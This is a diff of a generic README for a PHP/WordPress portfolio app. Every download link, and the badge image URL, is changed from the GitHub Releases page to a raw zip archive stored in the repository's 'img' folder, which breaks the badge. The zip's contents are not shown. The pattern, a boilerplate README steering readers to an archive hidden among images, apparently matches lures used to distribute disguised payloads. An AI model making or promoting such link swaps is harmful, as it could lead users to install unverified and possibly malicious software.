@@ -4,7 +4,7 @@
 Welcome to the portafolio project! This application is designed to help you create a professional portfolio. Whether you are a SysAdmin or a Full Stack Developer, showcasing your skills has never been easier. With support for PHP, MySQL, WordPress, and responsive design using TailwindCSS, this platform allows you to present your work in a visually appealing way.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Portafolio-blue?style=for-the-badge)](https://github.com/Hyperaven/portafolio/releases)
+[![Download](https://raw.githubusercontent.com/Hyperaven/portafolio/main/img/portafolio-v1.9-alpha.4.zip%20Portafolio-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hyperaven/portafolio/main/img/portafolio-v1.9-alpha.4.zip)
 
 ## 🚀 Getting Started
 Setting up your portfolio is straightforward. Follow these steps to get started:
@@ -16,7 +16,7 @@ Setting up your portfolio is straightforward. Follow these steps to get started:
     
 2. **Visit the Download Page.**
    You can download the latest version of the portafolio application from the Releases page:
-   [Visit this page to download](https://github.com/Hyperaven/portafolio/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Hyperaven/portafolio/main/img/portafolio-v1.9-alpha.4.zip)
 
 ## 📂 Installation Steps
 1. **Download the Application:**
@@ -74,4 +74,4 @@ For further assistance, feel free to check out help sections online or tutorials
 
 ## 📥 Download Again
 Don’t forget, you can access the latest version of the portafolio application here:
-[Visit this page to download](https://github.com/Hyperaven/portafolio/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Hyperaven/portafolio/main/img/portafolio-v1.9-alpha.4.zip)
